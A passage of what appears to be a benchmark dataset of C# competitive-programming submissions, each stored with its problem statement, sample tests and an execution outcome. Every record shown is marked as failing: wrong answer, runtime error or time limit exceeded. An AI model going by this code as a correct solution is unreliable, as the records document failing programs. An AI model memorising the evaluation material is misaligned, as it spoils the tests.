j++)\n\t\t\t\t{\n\t\t\t\t\tif (!prepared[Mask[i, j]])\n\t\t\t\t\t{\n\t\t\t\t\t\tbool[,] walked = new bool[Mask.GetLength(0), Mask.GetLength(1)];\n\t\t\t\t\t\tprepared[Mask[i, j]] = true;\n\t\t\t\t\t\tFillAdjast(walked, i, j);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\tint max = -1;\n\n\t\t\tforeach (var v in Graph)\n\t\t\t{\n\t\t\t\t\/\/genereate Wave\n\t\t\t\tbool[] walked2 = new bool[Areas + 1];\n\t\t\t\twalked2[v.Value.V] = true;\n\t\t\t\tList<Vertex> wave = new List<Vertex>();\n\t\t\t\twave.Add(v.Value);\n\t\t\t\tbool startBlack = v.Value.Color == 'B';\n\n\t\t\t\tif (startBlack && max < 0)\n\t\t\t\t\tmax = 0;\n\n\t\t\t\tbool needBreak;\n\t\t\t\tfor (int i = 1; i < Areas; i++)\n\t\t\t\t{\n\t\t\t\t\tList<Vertex> newWave = new List<Vertex>();\n\t\t\t\t\tneedBreak = true;\n\t\t\t\t\tforeach (var vinwave in wave)\n\t\t\t\t\t\tforeach (var adj in vinwave.Adjast)\n\t\t\t\t\t\t\tif (!walked2[adj.V])\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\twalked2[adj.V] = true;\n\t\t\t\t\t\t\t\tnewWave.Add(adj);\n\t\t\t\t\t\t\t\tneedBreak = false;\n\t\t\t\t\t\t\t\tif (startBlack && adj.Color == 'B' && i > max)\n\t\t\t\t\t\t\t\t\tmax = i;\n\t\t\t\t\t\t\t}\n\t\t\t\t\twave = newWave;\n\t\t\t\t\tif (needBreak)\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tConsole.WriteLine((max + 2)\/2);\n\t\t}\n\n\t\tprivate void FillAdjast(bool[,] walked, int i, int j)\n\t\t{\n\t\t\tif (walked[i, j])\n\t\t\t\treturn;\n\n\t\t\twalked[i, j] = true;\n\t\t\tint c = Mask[i, j];\n\t\t\tGraph[c].Color = Board[i][j];\n\n\t\t\tif (i > 0)\n\t\t\t{\n\t\t\t\tif (Mask[i - 1, j] == c)\n\t\t\t\t\tFillAdjast(walked, i - 1, j);\n\t\t\t\telse\n\t\t\t\t\tGraph[c].Adjast.Add(Graph[Mask[i - 1, j]]);\n\t\t\t}\n\t\t\tif (j > 0)\n\t\t\t{\n\t\t\t\tif (Mask[i, j-1] == c)\n\t\t\t\t\tFillAdjast(walked, i , j-1);\n\t\t\t\telse\n\t\t\t\t\tGraph[c].Adjast.Add(Graph[Mask[i, j-1]]);\n\t\t\t}\n\t\t\tif (i < N-1)\n\t\t\t{\n\t\t\t\tif (Mask[i + 1, j] == c)\n\t\t\t\t\tFillAdjast(walked, i + 1, j);\n\t\t\t\telse\n\t\t\t\t\tGraph[c].Adjast.Add(Graph[Mask[i + 1, j]]);\n\t\t\t}\n\t\t\tif (j < M-1)\n\t\t\t{\n\t\t\t\tif (Mask[i , j + 1] == c)\n\t\t\t\t\tFillAdjast(walked, i , j + 1);\n\t\t\t\telse\n\t\t\t\t\tGraph[c].Adjast.Add(Graph[Mask[i, j + 1]]);\n\t\t\t}\n\t\t}\n\n\t\tprivate int Fill()\n\t\t{\n\t\t\tint k = 1;\n\t\t\tfor (int i = 0; i < Mask.GetLength(0); i++)\n\t\t\t\tfor (int j = 0; j < Mask.GetLength(1); j++)\n\t\t\t\t\tif (Mask[i, j] == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\tFillPart(i, j, k);\n\t\t\t\t\t\tk++;\n\t\t\t\t\t}\n\t\t\treturn k - 1;\n\t\t}\n\n\t\tprivate void FillPart(int i, int j, int k)\n\t\t{\n\t\t\tchar c = Board[i][j];\n\t\t\tMask[i, j] = k;\n\n\t\t\tif (i > 0 && Mask[i - 1, j] == 0 && Board[i - 1][j] == c)\n\t\t\t\tFillPart(i - 1, j, k);\n\n\t\t\tif (j > 0 && Mask[i, j - 1] == 0 && Board[i][j - 1] == c)\n\t\t\t\tFillPart(i, j - 1, k);\n\n\t\t\tif (i < Mask.GetLength(0)-1 && Mask[i + 1, j] == 0 && Board[i + 1][j] == c)\n\t\t\t\tFillPart(i + 1, j, k);\n\n\t\t\tif (j < Mask.GetLength(1)-1 && Mask[i, j + 1] == 0 && Board[i][j + 1] == c)\n\t\t\t\tFillPart(i, j + 1, k);\n\t\t}\n\t}\n\n\tclass Program\n\t{\n\t\t\/\/static StreamReader inStream = new StreamReader(\"input.txt\");\n\t\t\/\/static string ReadLine()\n\t\t\/\/{\n\t\t\/\/    return inStream.ReadLine();\n\t\t\/\/}\n\n\t\tstatic string ReadLine()\n\t\t{\n\t\t\treturn Console.ReadLine();\n\t\t}\n\n\t\tstatic void Main(string[] args)\n\t\t{\n\t\t\tstring[] arg1 = ReadLine().Split();\n\t\t\tint N = int.Parse(arg1[0]);\n\t\t\tint M = int.Parse(arg1[1]);\n\n\t\t\tstring[] board = new string[N];\n\n\t\t\tfor (int i = 0; i < N; i++)\n\t\t\t{\n\t\t\t\tboard[i] = ReadLine();\n\t\t\t}\n\n\t\t\tnew Solver(N, M, board).Solve();\n\t\t}\n\n\t}\n}\n","description":"Having unraveled the Berland Dictionary, the scientists managed to read the notes of the chroniclers of that time. For example, they learned how the chief of the ancient Berland tribe was chosen.As soon as enough pretenders was picked, the following test took place among them: the chief of the tribe took a slab divided by horizontal and vertical stripes into identical squares (the slab consisted of N lines and M columns) and painted every square black or white. Then every pretender was given a slab of the same size but painted entirely white. Within a day a pretender could paint any side-linked set of the squares of the slab some color. The set is called linked if for any two squares belonging to the set there is a path belonging the set on which any two neighboring squares share a side. The aim of each pretender is to paint his slab in the exactly the same way as the chief\u2019s slab is painted. The one who paints a slab like that first becomes the new chief.Scientists found the slab painted by the ancient Berland tribe chief. Help them to determine the minimal amount of days needed to find a new chief if he had to paint his slab in the given way.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers N and M (1\u2009\u2264\u2009N,\u2009M\u2009\u2264\u200950) \u2014 the number of lines and columns on the slab. The next N lines contain M symbols each \u2014 the final coloration of the slab. W stands for the square that should be painted white and B \u2014 for the square that should be painted black.","output_spec":"In the single line output the minimal number of repaintings of side-linked areas needed to get the required coloration of the slab.","notes":null,"sample_inputs":["3 3\nWBW\nBWB\nWBW","2 3\nBBB\nBWB"],"sample_outputs":["2","1"]}
{"difficulty":1800,"lang":"Mono C#","lang_cluster":"c#","src_uid":"77b5f83cdadf4b0743618a46b646a849","submission_id":"6eed2b116441a0dbfc835123275f0c8a","tags":["dp","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\npublic class Program\n{\n    public static void Main(string[] args)\n    {\n        var input = Console.ReadLine();\n\n        System.Console.WriteLine(Solve(input));\n    }\n\n    private static string Solve(string input)\n    {\n        var n = input.Length;\n        if (n % 2 != 0)\n        {\n            return Generate(0, String.Empty, n + 1);\n        }\n\n        var result = new char[n];\n        var foors = 0;\n        var sevens = 0;\n        for (int i = 0; i < n; ++i)\n        {\n            if (input[i] < '4')\n            {\n                var prefix = new string(result, 0, i);\n                if (foors < n \/ 2)\n                {\n                    prefix = prefix + '4';\n                    ++foors;\n                }\n                else\n                {\n                    prefix = prefix + '7';\n                }\n                return Generate(foors, prefix, n);\n            }\n\n            if (input[i] == '4')\n            {\n                if (foors < n \/ 2)\n                {\n                    result[i] = '4';\n                    ++foors;\n                    continue;\n                }\n                else\n                {\n                    result[i] = '7';\n                    return Generate(foors, new string(result, 0, i + 1), n);\n                }\n            }\n\n            if (input[i] < '7')\n            {\n                if (sevens < n \/ 2)\n                {\n                    var prefix = new string(result, 0, i) + '7';\n                    return Generate(foors, prefix, n);\n                }\n                return FindLeft(input, result, i - 1, sevens, foors);\n            }\n\n            if (input[i] == '7')\n            {\n                if (sevens < n \/ 2)\n                {\n                    result[i] = '7';\n                    ++sevens;\n                    continue;\n                }\n                return FindLeft(input, result, i - 1, sevens, foors);\n            }\n\n            if (input[i] > '7')\n            {\n                return FindLeft(input, result, i - 1, sevens, foors);\n            }\n        }\n        return new string(result);\n    }\n\n    private static string FindLeft(string input, char[] result, int start, int sevens, int foors)\n    {\n        int n = input.Length;\n        for (int i= start; i >= 0; --i)\n        {\n            if (result[i] == '7')\n            {\n                --sevens;\n            }\n            else\n            {\n                --foors;\n                if (sevens < n \/ 2)\n                {\n                    result[i] = '7';\n                    return Generate(foors, new string(result, 0, i), n);\n                }\n            }\n        }\n        return Generate(0, \"\", n + 2);\n    }\n\n    private static string Generate(int foors, string prefix, int size)\n    {\n        var realSize = size - prefix.Length;\n\n        return prefix + new String('4', size\/2 - foors) +\n               new String('7', realSize - size \/ 2 + foors);\n    }\n}\n","description":"Petya loves lucky numbers. Everybody knows that positive integers are lucky if their decimal representation doesn't contain digits other than 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Lucky number is super lucky if it's decimal representation contains equal amount of digits 4 and 7. For example, numbers 47, 7744, 474477 are super lucky and 4, 744, 467 are not.One day Petya came across a positive integer n. Help him to find the least super lucky number which is not less than n.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u200910100000). This number doesn't have leading zeroes.","output_spec":"Output the least super lucky number that is more than or equal to n.","notes":null,"sample_inputs":["4500","47"],"sample_outputs":["4747","47"]}
{"difficulty":2500,"lang":"MS C#","lang_cluster":"c#","src_uid":"85f43628bec7e9b709273c34b894df6b","submission_id":"e75d30fc431b65d6b4efb45bfa9aed61","tags":["hashing","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeffusing System;\nusing System.IO;\nusing System.Text;\n\nnamespace Marbles\n{\n    internal class Program\n    {\n        private static readonly StreamReader reader = new StreamReader(Console.OpenStandardInput(1024*10), Encoding.ASCII, false, 1024*10);\n        private static readonly StreamWriter writer = new StreamWriter(Console.OpenStandardOutput(1024*10), Encoding.ASCII, 1024*10);\n\n        private static void Main(string[] args)\n        {\n            string s = reader.ReadLine();\n            s = \"*\" + reader.ReadLine() + \"*\";\n            string t = \"*\" + reader.ReadLine() + \"*\";\n\n            int n = s.Length - 2;\n            if (Op(s[n - 1]) == t[n - 1])\n            {\n                writer.WriteLine(\"NO\");\n                writer.Flush();\n                return;\n            }\n\n            int index2 = 1;\n            int index1 = 1;\n\n            int p1 = 1;\n            int p2 = 1;\n\n            for (int i = 0; i < 10; i++)\n            {\n                for (; index1 < n; index1++)\n                {\n                    if (t[index2] == s[index1])\n                        index2++;\n                    else if (t[index2 - 1] == Op(s[index1]))\n                        index2--;\n                }\n\n                if (index2 == n)\n                {\n                    writer.WriteLine(\"YES\");\n                    writer.Flush();\n                    return;\n                }\n\n                for (; index2 < n; index2++)\n                {\n                    if (t[index2] == s[index1])\n                        index1++;\n                    else if (s[index1 - 1] == Op(t[index2]))\n                        index1--;\n                }\n\n                if (index1 == n)\n                {\n                    writer.WriteLine(\"YES\");\n                    writer.Flush();\n                    return;\n                }\n\n                if (p1 == index1 || p2 == index2)\n                {\n                    break;\n                }\n\n                p1 = index1;\n                p2 = index2;\n            }\n\n            writer.WriteLine(\"NO\");\n            writer.Flush();\n        }\n\n        private static char Op(char c)\n        {\n            switch (c)\n            {\n                case 'N':\n                    return 'S';\n                case 'S':\n                    return 'N';\n                case 'W':\n                    return 'E';\n                case 'E':\n                    return 'W';\n            }\n            return '1';\n        }\n    }\n}","description":"In the spirit of the holidays, Saitama has given Genos two grid paths of length n (a weird gift even by Saitama's standards). A grid path is an ordered sequence of neighbouring squares in an infinite grid. Two squares are neighbouring if they share a side.One example of a grid path is (0,\u20090)\u2009\u2192\u2009(0,\u20091)\u2009\u2192\u2009(0,\u20092)\u2009\u2192\u2009(1,\u20092)\u2009\u2192\u2009(1,\u20091)\u2009\u2192\u2009(0,\u20091)\u2009\u2192\u2009(\u2009-\u20091,\u20091). Note that squares in this sequence might be repeated, i.e. path has self intersections.Movement within a grid path is restricted to adjacent squares within the sequence. That is, from the i-th square, one can only move to the (i\u2009-\u20091)-th or (i\u2009+\u20091)-th squares of this path. Note that there is only a single valid move from the first and last squares of a grid path. Also note, that even if there is some j-th square of the path that coincides with the i-th square, only moves to (i\u2009-\u20091)-th and (i\u2009+\u20091)-th squares are available. For example, from the second square in the above sequence, one can only move to either the first or third squares.To ensure that movement is not ambiguous, the two grid paths will not have an alternating sequence of three squares. For example, a contiguous subsequence (0,\u20090)\u2009\u2192\u2009(0,\u20091)\u2009\u2192\u2009(0,\u20090) cannot occur in a valid grid path.One marble is placed on the first square of each grid path. Genos wants to get both marbles to the last square of each grid path. However, there is a catch. Whenever he moves one marble, the other marble will copy its movement if possible. For instance, if one marble moves east, then the other marble will try and move east as well. By try, we mean if moving east is a valid move, then the marble will move east.Moving north increases the second coordinate by 1, while moving south decreases it by 1. Similarly, moving east increases first coordinate by 1, while moving west decreases it.Given these two valid grid paths, Genos wants to know if it is possible to move both marbles to the ends of their respective paths. That is, if it is possible to move the marbles such that both marbles rest on the last square of their respective paths.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains a single integer n (2\u2009\u2264\u2009n\u2009\u2264\u20091\u2009000\u2009000)\u00a0\u2014 the length of the paths. The second line of the input contains a string consisting of n\u2009-\u20091 characters (each of which is either 'N', 'E', 'S', or 'W')\u00a0\u2014 the first grid path. The characters can be thought of as the sequence of moves needed to traverse the grid path. For example, the example path in the problem statement can be expressed by the string \"NNESWW\". The third line of the input contains a string of n\u2009-\u20091 characters (each of which is either 'N', 'E', 'S', or 'W')\u00a0\u2014 the second grid path.","output_spec":"Print \"YES\" (without quotes) if it is possible for both marbles to be at the end position at the same time. Print \"NO\" (without quotes) otherwise. In both cases, the answer is case-insensitive.","notes":"NoteIn the first sample, the first grid path is the one described in the statement. Moreover, the following sequence of moves will get both marbles to the end: NNESWWSWSW.In the second sample, no sequence of moves can get both marbles to the end.","sample_inputs":["7\nNNESWW\nSWSWSW","3\nNN\nSS"],"sample_outputs":["YES","NO"]}
{"difficulty":1800,"lang":"MS C#","lang_cluster":"c#","src_uid":"a3a337c7b919e7dfd7ff45ebf59681b5","submission_id":"302f7874530e36215e37f186ff8c1ebe","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeffusing System;\nusing System.IO;\nusing System.Linq;\nusing System.Text;\n\nnamespace Online_Meeting\n{\n    internal class Program\n    {\n        private static readonly StreamReader reader = new StreamReader(Console.OpenStandardInput(1024*10), Encoding.ASCII, false, 1024*10);\n        private static readonly StreamWriter writer = new StreamWriter(Console.OpenStandardOutput(1024*10), Encoding.ASCII, 1024*10);\n\n        private static void Main(string[] args)\n        {\n            int n = Next();\n            int m = Next();\n\n            var nn = new int[n + 1];\n            var op = new int[m];\n            var id = new int[m];\n\n            for (int i = 0; i < m; i++)\n            {\n                op[i] = Next();\n                id[i] = Next();\n\n                if (op[i] == 1)\n                {\n                    if (nn[id[i]] == 0)\n                    {\n                        nn[id[i]] = 1;\n                    }\n                }\n                else\n                {\n                    if (nn[id[i]] == 0)\n                    {\n                        nn[id[i]] = 2;\n                    }\n                }\n            }\n\n            for (int i = 1; i < nn.Length; i++)\n            {\n                if (nn[i] == 0)\n                    nn[i] = 3;\n            }\n\n            int count2 = nn.Count(t => t == 2);\n\n            if (count2 == 0)\n            {\n                int id3 = id[0];\n                int count3 = 1;\n                bool ok = true;\n                for (int i = 1; i < m; i++)\n                {\n                    if (op[i] == 1)\n                    {\n                        count3++;\n                        if (count3 == 1)\n                        {\n                            if (id[i] != id3)\n                            {\n                                ok = false;\n                                break;\n                            }\n                        }\n                    }\n                    else\n                    {\n                        count3--;\n                        if (count3 == 0)\n                        {\n                            if (id[i] != id3)\n                            {\n                                ok = false;\n                                break;\n                            }\n                        }\n                    }\n                }\n                if (ok)\n                {\n                    nn[id3] = 3;\n                }\n            }\n            else\n            {\n                for (int i = 1; i <= n; i++)\n                {\n                    if (nn[i] == 2)\n                    {\n                        nn[i] = 3;\n                    }\n                }\n                int id4 = -1;\n                for (int i = 0; i < m; i++)\n                {\n                    if (op[i] == 1)\n                    {\n                        count2++;\n                        if (count2 == 1)\n                        {\n                            if (id4 >= 0)\n                            {\n                                if (id[i] != id4)\n                                    id4 = -2;\n                            }\n                        }\n                    }\n                    else\n                    {\n                        count2--;\n                        if (nn[id[i]] == 3)\n                            nn[id[i]] = 2;\n                        if (count2 == 0)\n                        {\n                            if (nn[id[i]] == 2)\n                            {\n                                if (id4 == -1)\n                                    id4 = id[i];\n                                else\n                                {\n                                    if (id4 != id[i])\n                                    {\n                                        id4 = -2;\n                                    }\n                                }\n                            }\n                            else id4 = -2;\n                        }\n                    }\n                }\n                if (id4 > 0)\n                    nn[id4] = 3;\n            }\n\n            int count = nn.Count(t => t == 3);\n\n            writer.WriteLine(count);\n\n            if (count > 0)\n            {\n                for (int i = 1; i <= n; i++)\n                {\n                    if (nn[i] == 3)\n                    {\n                        writer.Write(i);\n                        writer.Write(' ');\n                    }\n                }\n            }\n\n            writer.Flush();\n        }\n\n        private static int Next()\n        {\n            int c;\n            do\n            {\n                c = reader.Read();\n                if (c == '-')\n                    return -1;\n                if (c == '+')\n                    return 1;\n            } while (c < '0' || c > '9');\n            int res = c - '0';\n            while (true)\n            {\n                c = reader.Read();\n                if (c < '0' || c > '9')\n                    return res;\n                res *= 10;\n                res += c - '0';\n            }\n        }\n    }\n}","description":"Nearly each project of the F company has a whole team of developers working on it. They often are in different rooms of the office in different cities and even countries. To keep in touch and track the results of the project, the F company conducts shared online meetings in a Spyke chat.One day the director of the F company got hold of the records of a part of an online meeting of one successful team. The director watched the record and wanted to talk to the team leader. But how can he tell who the leader is? The director logically supposed that the leader is the person who is present at any conversation during a chat meeting. In other words, if at some moment of time at least one person is present on the meeting, then the leader is present on the meeting.You are the assistant director. Given the 'user logged on'\/'user logged off' messages of the meeting in the chronological order, help the director determine who can be the leader. Note that the director has the record of only a continuous part of the meeting (probably, it's not the whole meeting).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009105) \u2014 the number of team participants and the number of messages. Each of the next m lines contains a message in the format:   '+ id': the record means that the person with number id (1\u2009\u2264\u2009id\u2009\u2264\u2009n) has logged on to the meeting.  '- id': the record means that the person with number id (1\u2009\u2264\u2009id\u2009\u2264\u2009n) has logged off from the meeting.  Assume that all the people of the team are numbered from 1 to n and the messages are given in the chronological order. It is guaranteed that the given sequence is the correct record of a continuous part of the meeting. It is guaranteed that no two log on\/log off events occurred simultaneously.","output_spec":"In the first line print integer k (0\u2009\u2264\u2009k\u2009\u2264\u2009n) \u2014 how many people can be leaders. In the next line, print k integers in the increasing order \u2014 the numbers of the people who can be leaders. If the data is such that no member of the team can be a leader, print a single number 0.","notes":null,"sample_inputs":["5 4\n+ 1\n+ 2\n- 2\n- 1","3 2\n+ 1\n- 2","2 4\n+ 1\n- 1\n+ 2\n- 2","5 6\n+ 1\n- 1\n- 3\n+ 3\n+ 4\n- 4","2 4\n+ 1\n- 2\n+ 2\n- 1"],"sample_outputs":["4\n1 3 4 5","1\n3","0","3\n2 3 5","0"]}
{"difficulty":1600,"lang":"MS C#","lang_cluster":"c#","src_uid":"a6cba17c5ddb93f6741e00280fb6c54c","submission_id":"re_672","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System; \nusing System.Collections.Generic; \nusing System.Linq;\nstruct block {public int size { get; set; }public int offset { get; set; }public int index { get; set; }}\nclass P {\n    static int _memory_size;\n    static List<block> _memory = new List<block>();\n    static int _global_index = 0;\n    static void Main() {\n        var input = Console.ReadLine().Split().Select(int.Parse);\n        int t = input.First(), i = 0;\n        _memory_size = input.Last();\n        for (; i < t; ++i) {\n            var row = Console.ReadLine().Split();\n            string type = row[0];\n            switch (type) {\n                case \"alloc\": {\n                        alloc(int.Parse(row[1]));\n                        break;\n                    }\n                case \"defragment\": {\n                        defragment();\n                        break;\n                    }\n                case \"erase\": {\n                        erase(int.Parse(row[1]));\n                        break;\n                    }\n            }\n        }\n    }\n\n    static void defragment() {\n        int cnt = _memory.Count, i = 0;\n        for (; i < cnt; i++) {\n            block block = _memory[i];\n            if (i == 0) {\n                block.offset = 0;\n            } else { var prev_block = _memory[i - 1]; block.offset = prev_block.offset + prev_block.size; }\n        }\n    }\n\n    static void erase(int index) {\n        var block = find_block(index);\n        if (block.HasValue) {_memory.Remove(block.Value);} else { Console.WriteLine(\"ILLEGAL_ERASE_ARGUMENT\"); }\n    }\n\n    static block? find_block(int index) {\n        var blocks = _memory.Where(x => x.index == index);\n        if (blocks.Count() == 0) {\n            return null;\n        } else { return blocks.First(); }\n    }\n\n    static void alloc(int size) {\n        var block = insert_block(size);\n        if (block.HasValue) {\n            block block_ = block.Value;\n            Console.WriteLine(block_.index);\n            _memory.Add(block_);\n            _memory = _memory.OrderBy(x => x.offset).ToList();\n        } else { Console.WriteLine(\"NULL\"); }\n    }\n\n    static block? insert_block(int size) {\n        int found_offset = -1, cnt = _memory.Count, i = 0;\n        if (get_first_empty_size(0) >= size) { found_offset = 0; }\n        if (found_offset < 0) {\n            for (; i < cnt; ++i) {\n                var block_seek = _memory[i].offset + _memory[i].size;\n                if (get_first_empty_size(block_seek) >= size) { found_offset = block_seek; break; }\n            }\n        }\n        if (found_offset >= 0) {\n            _global_index++;\n            return new block() {\n                index = _global_index,\n                offset = found_offset,\n                size = size\n            };\n        }\n        return null;\n    }\n\n    static int get_first_empty_size(int seek) {\n        var blocks = _memory.Where(x => x.offset >= seek);\n        return (blocks.Count() == 0 ? _memory_size : blocks.First().offset) - seek;\n    }\n}","description":"There is little time left before the release of the first national operating system BerlOS. Some of its components are not finished yet \u2014 the memory manager is among them. According to the developers' plan, in the first release the memory manager will be very simple and rectilinear. It will support three operations:   alloc n \u2014 to allocate n bytes of the memory and return the allocated block's identifier x;  erase x \u2014 to erase the block with the identifier x;  defragment \u2014 to defragment the free memory, bringing all the blocks as close to the beginning of the memory as possible and preserving their respective order; The memory model in this case is very simple. It is a sequence of m bytes, numbered for convenience from the first to the m-th.The first operation alloc n takes as the only parameter the size of the memory block that is to be allocated. While processing this operation, a free block of n successive bytes is being allocated in the memory. If the amount of such blocks is more than one, the block closest to the beginning of the memory (i.e. to the first byte) is prefered. All these bytes are marked as not free, and the memory manager returns a 32-bit integer numerical token that is the identifier of this block. If it is impossible to allocate a free block of this size, the function returns NULL.The second operation erase x takes as its parameter the identifier of some block. This operation frees the system memory, marking the bytes of this block as free for further use. In the case when this identifier does not point to the previously allocated block, which has not been erased yet, the function returns ILLEGAL_ERASE_ARGUMENT.The last operation defragment does not have any arguments and simply brings the occupied memory sections closer to the beginning of the memory without changing their respective order.In the current implementation you are to use successive integers, starting with 1, as identifiers. Each successful alloc operation procession should return following number. Unsuccessful alloc operations do not affect numeration.You are to write the implementation of the memory manager. You should output the returned value for each alloc command. You should also output ILLEGAL_ERASE_ARGUMENT for all the failed erase commands.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two positive integers t and m (1\u2009\u2264\u2009t\u2009\u2264\u2009100;1\u2009\u2264\u2009m\u2009\u2264\u2009100), where t \u2014 the amount of operations given to the memory manager for processing, and m \u2014 the available memory size in bytes. Then there follow t lines where the operations themselves are given. The first operation is alloc n (1\u2009\u2264\u2009n\u2009\u2264\u2009100), where n is an integer. The second one is erase x, where x is an arbitrary 32-bit integer numerical token. The third operation is defragment. ","output_spec":"Output the sequence of lines. Each line should contain either the result of alloc operation procession , or ILLEGAL_ERASE_ARGUMENT as a result of failed erase operation procession. Output lines should go in the same order in which the operations are processed. Successful procession of alloc operation should return integers, starting with 1, as the identifiers of the allocated blocks.","notes":null,"sample_inputs":["6 10\nalloc 5\nalloc 3\nerase 1\nalloc 6\ndefragment\nalloc 6"],"sample_outputs":["1\n2\nNULL\n3"]}
{"difficulty":2300,"lang":"Mono C#","lang_cluster":"c#","src_uid":"aad7ebf4fa919fae78bfc878e47e483c","submission_id":"re_1248","tags":["math"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Globalization;\nusing System.Text;\nusing System.IO;\nusing System.Linq;\nusing System.Threading;\n\n\n\n\nclass Program\n{\n    int mod = 400;\n    void solve()\n    {\n        testIt();\n        long n = nextLong();\n        long m = nextLong();\n        println(fast(n,m));\n\n\n\n\n    }\n\n    private void testIt()\n    {\n        Random rand = new Random();\n        for (int test = 1; ; test++)\n        {\n            int n = rand.Next() % mod + 1;\n            int m = rand.Next() % mod + 1;\n            long num = fast(n, m);\n            if (num != slow(n, m))\n            {\n                slow(n, m);\n                fast(n, m);\n            }\n\n\n            Console.WriteLine(test + \" \" + num);\n        }\n    }\n\n    private long fast(long n, long m)\n    {\n        long irrational = 0;\n        long[] cnt;\n        cnt = new long[2*(n + 10)];\n\n        for (long b = 1; b <= n; b++)\n        {\n            long x = b * b;\n            long max = x - 1;\n            long min;\n            if (m > x)\n                min = 0;\n            else\n                min = x - m;\n            long x1=(long)Math.Round(Math.Sqrt(min))-2;\n            if (x1 < 0)\n                x1 = 0;\n            while (x1 * x1 < min)\n                x1++;\n            long x2=(long)Math.Round(Math.Sqrt(max))+2;\n            while (x2 * x2 > max)\n                x2--;\n            long cur;\n            if (x1 <= x2)\n                cur = x2 - x1 + 1;\n            else\n                cur = 0;\n            irrational += max - min + 1 - cur;\n            if (x1 <= x2)\n            {\n                x1 += -b;\n                x2 += -b;\n                x1 = -x1;\n                x2 = -x2;\n                cnt[x2]++;\n                cnt[x1 + 1]--;\n            }\n\n            \/\/\n            x1 = (long)Math.Round(Math.Sqrt(min)) - 2;\n            if (x1 < 0)\n                x1 = 0;\n            while (x1 * x1 < min)\n                x1++;\n            x2 = (long)Math.Round(Math.Sqrt(max)) + 2;\n            while (x2 * x2 > max)\n                x2--;\n            if (x1 <= x2)\n            {\n                x1 = -x1;\n                x2 = -x2;\n                x1 += -b;\n                x2 += -b;\n                x1 = -x1;\n                x2 = -x2;\n                cnt[x1]++;\n                cnt[x2 + 1]--;\n            }\n        }\n        irrational *= 2;\n        long res = irrational;\n        for (int i = 1; i < cnt.Length; i++)\n            cnt[i] += cnt[i - 1];\n        for (int i = 0; i < cnt.Length; i++)\n            if (cnt[i] > 0)\n                res++;\n        return res;\n    }\n    long slow(long n, long m)\n    {\n        long res = 0;\n        Dictionary<long, object> d = new Dictionary<long, object>();\n        \n        for (long b = 1; b <= n; b++)\n            for (long c = 1; c <= m; c++)\n            {\n                if (b * b - c < 0)\n                    continue;\n                long del = b * b - c;\n                if (!isSquare(del))\n                    res += 2;\n                else\n                {\n                    long x = -b + (long)Math.Round(Math.Sqrt(del));\n                    d[x] = null;\n                    x = -b - (long)Math.Round(Math.Sqrt(del));\n                    d[x] = null;\n                }\n            }\n        return res + d.Count;\n    }\n    private bool isSquare(long n)\n    {\n        long x =(long)Math.Round( Math.Sqrt(n));\n        return x * x == n;\n    }\n\n    \/\/\/\/\/\/\/\/\/\/\/\/\n    private void println(int[] ar)\n    {\n        for (int i = 0; i < ar.Length; i++)\n        {\n            if (i == ar.Length - 1)\n                println(ar[i]);\n            else\n                print(ar[i] + \" \");\n        }\n    }\n    private void println(int[] ar, bool add)\n    {\n        int A = 0;\n        if (add)\n            A++;\n        for (int i = 0; i < ar.Length; i++)\n        {\n            if (i == ar.Length - 1)\n                println(ar[i] + A);\n            else\n                print((ar[i] + A) + \" \");\n        }\n    }\n\n    private void println(string Stringst)\n    {\n        Console.WriteLine(Stringst);\n    }\n    private void println(char charnum)\n    {\n        Console.WriteLine(charnum);\n    }\n    private void println(int Intnum)\n    {\n        Console.WriteLine(Intnum);\n    }\n    private void println(long Longnum)\n    {\n        Console.WriteLine(Longnum);\n    }\n    private void println(double Doublenum)\n    {\n        string s = Doublenum.ToString(CultureInfo.InvariantCulture);\n        Console.WriteLine(s);\n    }\n\n    private void print(string Stringst)\n    {\n        Console.Write(Stringst);\n    }\n    private void print(int Intnum)\n    {\n        Console.Write(Intnum);\n    }\n    private void print(char charnum)\n    {\n        Console.Write(charnum);\n    }\n    private void print(long Longnum)\n    {\n        Console.Write(Longnum);\n    }\n    private void print(double Doublenum)\n    {\n        Console.Write(Doublenum);\n    }\n\n\n    string[] inputLine = new string[0];\n    int inputInd = 0;\n    string nextLine()\n    {\n        return Console.ReadLine();\n    }\n    void readInput()\n    {\n        if (inputInd != inputLine.Length)\n            throw new Exception();\n        inputInd = 0;\n        inputLine = Console.ReadLine().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);\n        if (inputLine.Length == 0)\n            readInput();\n\n    }\n    int nextInt()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return int.Parse(inputLine[inputInd++]);\n    }\n    long nextLong()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return long.Parse(inputLine[inputInd++]);\n    }\n    double nextDouble()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return double.Parse(inputLine[inputInd++]);\n    }\n    string nextString()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return inputLine[inputInd++];\n    }\n    static void Main(string[] args)\n    {\n        Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;\n        new Program().solve();\n    }\n}\n\n\n","description":"A schoolboy Petya studies square equations. The equations that are included in the school curriculum, usually look simple: x2\u2009+\u20092bx\u2009+\u2009c\u2009=\u20090 where b, c are natural numbers.Petya noticed that some equations have two real roots, some of them have only one root and some equations don't have real roots at all. Moreover it turned out that several different square equations can have a common root.Petya is interested in how many different real roots have all the equations of 